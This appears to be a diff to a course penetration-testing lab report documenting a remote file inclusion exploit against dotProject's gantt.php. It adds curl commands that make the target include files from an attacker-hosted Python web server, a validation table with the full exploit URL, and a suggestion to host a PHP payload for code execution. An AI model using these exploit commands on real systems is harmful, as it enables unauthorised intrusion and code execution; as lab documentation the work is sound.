@@ -234,9 +234,14 @@ cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
 
 # Terminal B — request includes remote file via dPconfig[root_dir] (trailing ? matches classic PoCs)
 curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/marker.txt?"
+
+# Optional second proof file — MUST live in the same directory the http.server was started from (~/rfi_poc), not ~/loot
+printf 'PROOF\n' > ~/rfi_poc/proof.txt
+curl -s "http://${LHOST}:8080/proof.txt"
+curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
 ```
 
-**Success signal:** response body contains **`RFI_MARKER_EPT`** (or obvious PHP **fatal** mentioning **`allow_url_include`**, **`Failed opening**`, **`http:// wrapper`**, which tells you the **`php.ini`** posture).
+**Success signal:** response body contains **`RFI_MARKER_EPT`** or **`PROOF`** (or obvious PHP **fatal** mentioning **`allow_url_include`**, **`Failed opening**`, **`http:// wrapper`**, which tells you the **`php.ini`** posture).
 
 #### Validation — RFI attempt **`102-003`** (`Connection refused`)
 
@@ -249,6 +254,17 @@ curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPco
 | **`Call to undefined function defVal()`** | The **jpgraph** include chain **did not complete** (dependencies missing after the failed remote step), so the script dies later — **expected** until the include path works. |
 
 **Fix the callback, then retry:** on Kali use the **VPN / lab interface IP** (`ip -br a`), **`python3 -m http.server 8080 --bind 0.0.0.0`**, confirm **`ss -tlnp | grep 8080`** shows a listener, and from another host on the same segment **`curl http://<LHOST>:8080/marker.txt`** if possible. Re-run the same **`curl`** to **`gantt.php`**.
+
+#### Validation — RFI confirmed **`102-004`** (`proof.txt` → **`PROOF`** in response body)
+
+![102-004 — local proof.txt OK; gantt.php reflects PROOF + stamp](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)
+
+| Field | Value |
+|-------|--------|
+| **Local check** | `curl -s "http://10.20.150.106:8080/proof.txt"` → **`PROOF`** (file served from **`~/rfi_poc/proof.txt`** — same cwd as **`http.server`**) |
+| **Exploit** | `curl -sik "http://10.20.160.102/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://10.20.150.106:8080/proof.txt?"` |
+| **Result** | **HTTP 200** — response body shows **`PROOF`** (twice, from include chain); then **`defVal()`** fatal as before — **RFI demonstrated** for the report |
+| **Stamp** | `echo TM6_afrocha; date` |
 
 **3 — If remote include works and course allows code execution:** host a **`<?php … ?>`** file on **`LHOST`** and repeat (only if **`allow_url_include`** allows execution — many configs do **not**); otherwise pivot to **LFI**/local tricks per **`searchsploit -x`**.
 
